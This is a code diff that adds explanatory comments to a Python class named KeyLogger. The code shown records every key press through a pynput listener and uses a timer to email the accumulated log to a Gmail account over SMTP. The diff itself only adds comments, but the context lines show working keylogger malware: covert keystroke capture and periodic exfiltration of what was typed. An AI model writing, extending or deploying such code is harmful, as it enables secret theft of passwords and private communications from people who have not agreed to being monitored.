@@ -16,6 +16,7 @@ class KeyLogger:
     def append_to_log(self, string):
         self.log += string
 
+    # captures key press events
     def process_key_press(self, key):
         try:
             current_key = str(key.char)
@@ -26,6 +27,7 @@ class KeyLogger:
                 current_key = " " + str(key) + " "
         self.append_to_log(current_key)
 
+    # sends email with the log
     def send_mail(self, email, password, message):
         try:
             server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -36,12 +38,14 @@ class KeyLogger:
         except Exception as e:
             print("Error sending email: {e}")
 
+    #sends email every interval
     def report(self):
         self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""  
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
+    # intializes the keylogger
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
